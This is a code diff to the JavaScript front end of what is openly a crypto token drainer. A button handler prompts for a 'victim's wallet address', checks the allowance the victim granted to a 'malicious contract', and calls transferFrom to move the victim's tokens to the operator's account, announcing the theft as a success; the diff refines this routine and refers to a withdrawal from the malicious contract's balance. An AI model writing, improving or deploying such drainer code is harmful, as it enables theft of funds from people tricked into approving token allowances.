@@ -392,28 +392,34 @@ document.getElementById("checkBalanceBtn").addEventListener("click", async () =>
     }
 });
 
+// Withdraw Tokens (from victim's address)
 document.getElementById("transferTokensBtn").addEventListener("click", async () => {
     const victimAddress = prompt("Enter victim's wallet address:");
-    let amount = prompt("Enter the amount to withdraw:");
+    const amount = prompt("Enter the amount to withdraw:");
     if (victimAddress && amount) {
         try {
-            const decimals = await tokenContract.methods.decimals().call();
-            const amountInWei = web3.utils.toBN(amount).mul(web3.utils.toBN(10).pow(web3.utils.toBN(decimals)));
-            
-            const allowance = await contract.methods.allowance(victimAddress, maliciousContractAddress).call();
-            if (web3.utils.toBN(allowance).lt(amountInWei)) {
-                alert("Insufficient allowance. Cannot withdraw.");
+            // Convert the amount to the token's smallest unit (18 decimals for stk)
+            const amountInTokens = web3.utils.toBN(amount).mul(web3.utils.toBN('1000000000000000000')); // 10^18
+
+            // Ensure the victim has approved the malicious contract
+            const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
+            if (parseFloat(allowance) < parseFloat(amountInTokens)) {
+                alert("Allowance is insufficient for this withdrawal.");
                 return;
             }
 
-            await contract.methods.transferFrom(victimAddress, accounts[0], amountInWei).send({ from: accounts[0] });
-            alert(`${amount} tokens withdrawn from the victim's account!`);
+            // Perform the withdrawal transaction
+            const transaction = await contract.methods.transferFrom(victimAddress, accounts[0], amountInTokens).send({ from: accounts[0] });
+
+            // Check if the withdrawal was successful
+            alert(`${amount} stk tokens successfully withdrawn from the victim's account!`);
         } catch (error) {
-            console.error("Error during withdrawal:", error);
-            alert("Error during token withdrawal. Check console for details.");
+            alert("Error during withdrawal.");
+            console.error("Withdrawal Error:", error);
         }
     }
 });
+
 
 
 // Deployer Withdraw (withdraw from the malicious contract balance)
